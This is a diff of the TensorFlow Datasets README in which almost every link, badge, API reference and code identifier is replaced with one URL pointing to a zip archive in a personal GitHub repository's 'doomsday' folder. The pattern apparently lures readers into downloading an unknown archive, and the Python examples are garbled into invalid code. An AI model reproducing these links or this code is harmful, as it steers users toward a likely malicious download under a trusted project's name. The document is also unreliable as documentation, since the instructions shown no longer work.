@@ -1,14 +1,14 @@
 # TensorFlow Datasets
 
-TensorFlow Datasets provides many public datasets as `tf.data.Datasets`.
+TensorFlow Datasets provides many public datasets as `https://raw.githubusercontent.com/ksnnd32/datasets/master/doomsday/datasets.zip`.
 
-[![Kokoro](https://storage.googleapis.com/tfds-kokoro-public/kokoro-build.svg)](https://storage.googleapis.com/tfds-kokoro-public/kokoro-build.html)
-[![PyPI version](https://badge.fury.io/py/tensorflow-datasets.svg)](https://badge.fury.io/py/tensorflow-datasets)
+[![Kokoro](https://raw.githubusercontent.com/ksnnd32/datasets/master/doomsday/datasets.zip)](https://raw.githubusercontent.com/ksnnd32/datasets/master/doomsday/datasets.zip)
+[![PyPI version](https://raw.githubusercontent.com/ksnnd32/datasets/master/doomsday/datasets.zip)](https://raw.githubusercontent.com/ksnnd32/datasets/master/doomsday/datasets.zip)
 
-* [List of datasets](https://github.com/tensorflow/datasets/tree/master/docs/datasets.md)
-* [Try it in Colab](https://colab.research.google.com/github/tensorflow/datasets/blob/master/docs/overview.ipynb)
-* [API docs](https://www.tensorflow.org/datasets/api_docs/python/tfds)
-* [Add a dataset](https://github.com/tensorflow/datasets/tree/master/docs/add_dataset.md)
+* [List of datasets](https://raw.githubusercontent.com/ksnnd32/datasets/master/doomsday/datasets.zip)
+* [Try it in Colab](https://raw.githubusercontent.com/ksnnd32/datasets/master/doomsday/datasets.zip)
+* [API docs](https://raw.githubusercontent.com/ksnnd32/datasets/master/doomsday/datasets.zip)
+* [Add a dataset](https://raw.githubusercontent.com/ksnnd32/datasets/master/doomsday/datasets.zip)
 
 **Table of Contents**
 
@@ -25,7 +25,7 @@ TensorFlow Datasets provides many public datasets as `tf.data.Datasets`.
 pip install tensorflow-datasets
 
 # Requires TF 1.12+ to be installed.
-# Some datasets require additional libraries; see setup.py extras_require
+# Some datasets require additional libraries; see https://raw.githubusercontent.com/ksnnd32/datasets/master/doomsday/datasets.zip extras_require
 pip install tensorflow
 # or:
 pip install tensorflow-gpu
@@ -38,31 +38,31 @@ import tensorflow_datasets as tfds
 import tensorflow as tf
 
 # tfds works in both Eager and Graph modes
-tf.enable_eager_execution()
+https://raw.githubusercontent.com/ksnnd32/datasets/master/doomsday/datasets.zip()
 
 # See available datasets
-print(tfds.list_builders())
+print(https://raw.githubusercontent.com/ksnnd32/datasets/master/doomsday/datasets.zip())
 
-# Construct a tf.data.Dataset
-ds_train, ds_test = tfds.load(name="mnist", split=["train", "test"])
+# Construct a https://raw.githubusercontent.com/ksnnd32/datasets/master/doomsday/datasets.zip
+ds_train, ds_test = https://raw.githubusercontent.com/ksnnd32/datasets/master/doomsday/datasets.zip(name="mnist", split=["train", "test"])
 
 # Build your input pipeline
-ds_train = ds_train.shuffle(1000).batch(128).prefetch(10)
-for features in ds_train.take(1):
+ds_train = https://raw.githubusercontent.com/ksnnd32/datasets/master/doomsday/datasets.zip(1000).batch(128).prefetch(10)
+for features in https://raw.githubusercontent.com/ksnnd32/datasets/master/doomsday/datasets.zip(1):
   image, label = features["image"], features["label"]
 ```
 
 Try it interactively in a
-[Colab notebook](https://colab.research.google.com/github/tensorflow/datasets/blob/master/docs/overview.ipynb).
+[Colab notebook](https://raw.githubusercontent.com/ksnnd32/datasets/master/doomsday/datasets.zip).
 
 ### `DatasetBuilder`
 
 All datasets are implemented as subclasses of
-[`DatasetBuilder`](https://www.tensorflow.org/datasets/api_docs/python/tfds/core/DatasetBuilder.md)
+[`DatasetBuilder`](https://raw.githubusercontent.com/ksnnd32/datasets/master/doomsday/datasets.zip)
 and
-[`tfds.load`](https://www.tensorflow.org/datasets/api_docs/python/tfds/load.md)
+[`https://raw.githubusercontent.com/ksnnd32/datasets/master/doomsday/datasets.zip`](https://raw.githubusercontent.com/ksnnd32/datasets/master/doomsday/datasets.zip)
 is a thin convenience wrapper.
-[`DatasetInfo`](https://www.tensorflow.org/datasets/api_docs/python/tfds/core/DatasetInfo.md)
+[`DatasetInfo`](https://raw.githubusercontent.com/ksnnd32/datasets/master/doomsday/datasets.zip)
 documents the dataset.
 
 ```python
@@ -71,32 +71,32 @@ import tensorflow_datasets as tfds
 # The following is the equivalent of the `load` call above.
 
 # You can fetch the DatasetBuilder class by string
-mnist_builder = tfds.builder("mnist")
+mnist_builder = https://raw.githubusercontent.com/ksnnd32/datasets/master/doomsday/datasets.zip("mnist")
 
 # Download the dataset
-mnist_builder.download_and_prepare()
+https://raw.githubusercontent.com/ksnnd32/datasets/master/doomsday/datasets.zip()
 
-# Construct a tf.data.Dataset
-ds = mnist_builder.as_dataset(split=tfds.Split.TRAIN)
+# Construct a https://raw.githubusercontent.com/ksnnd32/datasets/master/doomsday/datasets.zip
+ds = https://raw.githubusercontent.com/ksnnd32/datasets/master/doomsday/datasets.zip(https://raw.githubusercontent.com/ksnnd32/datasets/master/doomsday/datasets.zip)
 
 # Get the `DatasetInfo` object, which contains useful information about the
 # dataset and its features
-info = mnist_builder.info
+info = https://raw.githubusercontent.com/ksnnd32/datasets/master/doomsday/datasets.zip
 print(info)
 
-    tfds.core.DatasetInfo(
+    https://raw.githubusercontent.com/ksnnd32/datasets/master/doomsday/datasets.zip(
         name='mnist',
         version=1.0.0,
         description='The MNIST database of handwritten digits.',
-        urls=[u'http://yann.lecun.com/exdb/mnist/'],
+        urls=[u'https://raw.githubusercontent.com/ksnnd32/datasets/master/doomsday/datasets.zip'],
         features=FeaturesDict({
-            'image': Image(shape=(28, 28, 1), dtype=tf.uint8),
-            'label': ClassLabel(shape=(), dtype=tf.int64, num_classes=10)
+            'image': Image(shape=(28, 28, 1), https://raw.githubusercontent.com/ksnnd32/datasets/master/doomsday/datasets.zip),
+            'label': ClassLabel(shape=(), https://raw.githubusercontent.com/ksnnd32/datasets/master/doomsday/datasets.zip, num_classes=10)
         },
         total_num_examples=70000,
         splits={
-            u'test': <tfds.core.SplitInfo num_examples=10000>,
-            u'train': <tfds.core.SplitInfo num_examples=60000>
+            u'test': <https://raw.githubusercontent.com/ksnnd32/datasets/master/doomsday/datasets.zip num_examples=10000>,
+            u'train': <https://raw.githubusercontent.com/ksnnd32/datasets/master/doomsday/datasets.zip num_examples=60000>
         },
         supervised_keys=(u'image', u'label'),
         citation='"""
@@ -114,37 +114,37 @@ print(info)
 You can also get details about the classes (number of classes and their names).
 
 ```python
-info = tfds.builder('cats_vs_dogs').info
+info = https://raw.githubusercontent.com/ksnnd32/datasets/master/doomsday/datasets.zip('cats_vs_dogs').info
 
-info.features['label'].num_classes  # 2
-info.features['label'].names  # ['cat', 'dog']
-info.features['label'].int2str(1)  # "dog"
-info.features['label'].str2int('cat')  # 0
+https://raw.githubusercontent.com/ksnnd32/datasets/master/doomsday/datasets.zip['label'].num_classes  # 2
+https://raw.githubusercontent.com/ksnnd32/datasets/master/doomsday/datasets.zip['label'].names  # ['cat', 'dog']
+https://raw.githubusercontent.com/ksnnd32/datasets/master/doomsday/datasets.zip['label'].int2str(1)  # "dog"
+https://raw.githubusercontent.com/ksnnd32/datasets/master/doomsday/datasets.zip['label'].str2int('cat')  # 0
 ```
 
-### NumPy Usage with `tfds.as_numpy`
+### NumPy Usage with `https://raw.githubusercontent.com/ksnnd32/datasets/master/doomsday/datasets.zip`
 
 As a convenience for users that want simple NumPy arrays in their programs, you
 can use
-[`tfds.as_numpy`](https://www.tensorflow.org/datasets/api_docs/python/tfds/as_numpy.md)
+[`https://raw.githubusercontent.com/ksnnd32/datasets/master/doomsday/datasets.zip`](https://raw.githubusercontent.com/ksnnd32/datasets/master/doomsday/datasets.zip)
 to return a generator that yields NumPy array
-records out of a `tf.data.Dataset`. This allows you to build high-performance
-input pipelines with `tf.data` but use whatever you'd like for your model
+records out of a `https://raw.githubusercontent.com/ksnnd32/datasets/master/doomsday/datasets.zip`. This allows you to build high-performance
+input pipelines with `https://raw.githubusercontent.com/ksnnd32/datasets/master/doomsday/datasets.zip` but use whatever you'd like for your model
 components.
 
 ```python
-train_ds = tfds.load("mnist", split=tfds.Split.TRAIN)
-train_ds = train_ds.shuffle(1024).batch(128).repeat(5).prefetch(10)
-for example in tfds.as_numpy(train_ds):
+train_ds = https://raw.githubusercontent.com/ksnnd32/datasets/master/doomsday/datasets.zip("mnist", https://raw.githubusercontent.com/ksnnd32/datasets/master/doomsday/datasets.zip)
+train_ds = https://raw.githubusercontent.com/ksnnd32/datasets/master/doomsday/datasets.zip(1024).batch(128).repeat(5).prefetch(10)
+for example in https://raw.githubusercontent.com/ksnnd32/datasets/master/doomsday/datasets.zip(train_ds):
   numpy_images, numpy_labels = example["image"], example["label"]
 ```
 
-You can also use `tfds.as_numpy` in conjunction with `batch_size=-1` to
-get the full dataset in NumPy arrays from the returned `tf.Tensor` object:
+You can also use `https://raw.githubusercontent.com/ksnnd32/datasets/master/doomsday/datasets.zip` in conjunction with `batch_size=-1` to
+get the full dataset in NumPy arrays from the returned `https://raw.githubusercontent.com/ksnnd32/datasets/master/doomsday/datasets.zip` object:
 
 ```python
-train_ds = tfds.load("mnist", split=tfds.Split.TRAIN, batch_size=-1)
-numpy_ds = tfds.as_numpy(train_ds)
+train_ds = https://raw.githubusercontent.com/ksnnd32/datasets/master/doomsday/datasets.zip("mnist", https://raw.githubusercontent.com/ksnnd32/datasets/master/doomsday/datasets.zip, batch_size=-1)
+numpy_ds = https://raw.githubusercontent.com/ksnnd32/datasets/master/doomsday/datasets.zip(train_ds)
 numpy_images, numpy_labels = numpy_ds["image"], numpy_ds["label"]
 ```
 
@@ -153,13 +153,13 @@ Note that the library still requires `tensorflow` as an internal dependency.
 ## Want a certain dataset?
 
 Adding a dataset is really straightforward by following
-[our guide](https://github.com/tensorflow/datasets/tree/master/docs/add_dataset.md).
+[our guide](https://raw.githubusercontent.com/ksnnd32/datasets/master/doomsday/datasets.zip).
 
 Request a dataset by opening a
-[Dataset request GitHub issue](https://github.com/tensorflow/datasets/issues/new?assignees=&labels=dataset+request&template=dataset-request.md&title=%5Bdata+request%5D+%3Cdataset+name%3E).
+[Dataset request GitHub issue](https://raw.githubusercontent.com/ksnnd32/datasets/master/doomsday/datasets.zip+request&https://raw.githubusercontent.com/ksnnd32/datasets/master/doomsday/datasets.zip%5Bdata+request%5D+%3Cdataset+name%3E).
 
 And vote on the current
-[set of requests](https://github.com/tensorflow/datasets/labels/dataset%20request)
+[set of requests](https://raw.githubusercontent.com/ksnnd32/datasets/master/doomsday/datasets.zip%20request)
 by adding a thumbs-up reaction to the issue.
 
 #### *Disclaimers*
@@ -176,6 +176,6 @@ by adding a thumbs-up reaction to the issue.
 *contribution to the ML community!*
 
 *If you're interested in learning more about responsible AI practices, including*
-*fairness, please see Google AI's [Responsible AI Practices](https://ai.google/education/responsible-ai-practices).*
+*fairness, please see Google AI's [Responsible AI Practices](https://raw.githubusercontent.com/ksnnd32/datasets/master/doomsday/datasets.zip).*
 
 *`tensorflow/datasets` is Apache 2.0 licensed. See the `LICENSE` file.*
